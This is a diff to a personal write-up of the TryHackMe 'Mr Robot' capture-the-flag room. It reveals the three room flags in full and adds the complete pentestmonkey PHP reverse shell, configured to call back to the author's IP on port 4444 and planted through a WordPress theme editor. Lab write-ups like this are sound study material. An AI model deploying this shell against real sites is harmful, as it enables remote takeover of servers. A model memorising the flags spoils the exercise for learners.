@@ -1,4 +1,4 @@
-# Mr Robot CTF
+# TryHackMe — Mr Robot CTF
 
 My own writeup for this one, going through it in the order I actually did things —
 including the dead ends, because those are usually the more instructive part.
@@ -97,7 +97,7 @@ file directly:
 http://10.49.189.13/key-1-of-3.txt
 ```
 
-**Key 1:** `073boooooooofb30724b9`
+**Key 1:** `073403c8a58a1f80d943455fb30724b9`
 
 (`fsocity.dic` is the custom wordlist referenced by the room — grabbed it too in case I needed
 it for brute-forcing later, but didn't end up needing it.)
@@ -153,9 +153,17 @@ its template files and it'll get served live.
 3. Selected all existing content in the editor box, deleted it.
 4. Pasted in the pentestmonkey PHP reverse shell
    (`https://github.com/pentestmonkey/php-reverse-shell`), editing:
+   ```php
+   $ip = '192.168.179.226';  // my tun0 IP
+   $port = 4444;
+   ```
+5. Clicked **Update File** → got the "File edited successfully" confirmation.
 
-   ...
-    <?php
+Full contents of the file I pasted in (pentestmonkey's `php-reverse-shell.php`, with `$ip`
+and `$port` already updated to my values above):
+
+```php
+<?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
 //
@@ -203,8 +211,8 @@ its template files and it'll get served live.
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '127.0.0.1';  // CHANGE THIS
-$port = 1234;       // CHANGE THIS
+$ip = '192.168.179.226';  // CHANGE THIS
+$port = 4444;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -340,17 +348,11 @@ proc_close($process);
 function printit ($string) {
 	if (!$daemon) {
 		print "$string\n";
-  	}
+	}
 }
 
-       ?> 
-   ...
-   
-   ```php
-   $ip = '192.168.179.226';  // my tun0 IP
-   $port = 4444;
-   ```
-6. Clicked **Update File** → got the "File edited successfully" confirmation.
+?>
+```
 
 Started the listener:
 ```bash
@@ -512,7 +514,7 @@ password.raw-md5
 cat key-2-of-3.txt
 ```
 
-**Key 2:** `822c739561ggggggge3eb39f959`
+**Key 2:** `822c73956184f694993bede3eb39f959`
 
 (Commands were echoing twice at this point since I hadn't re-run the pty upgrade on this fresh
 connection — cosmetic issue, didn't block anything.)
@@ -589,7 +591,7 @@ Root. Grabbed the final flag:
 root@ip-10-49-189-13:/# cat /root/key-3-of-3.txt
 ```
 
-**Key 3:** `04787ddef27fffffffff670b4e4`
+**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`
 
 ---
 
@@ -597,9 +599,9 @@ root@ip-10-49-189-13:/# cat /root/key-3-of-3.txt
 
 | Key | Value |
 |---|---|
-| Key 1 | `073403c8booooooooo5fb30724b9` |
-| Key 2 | `822c73gggggggggggbede3eb39f959` |
-| Key 3 | `04787ddefffffffffff21670b4e4` |
+| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
+| Key 2 | `822c73956184f694993bede3eb39f959` |
+| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |
 
 ---
 
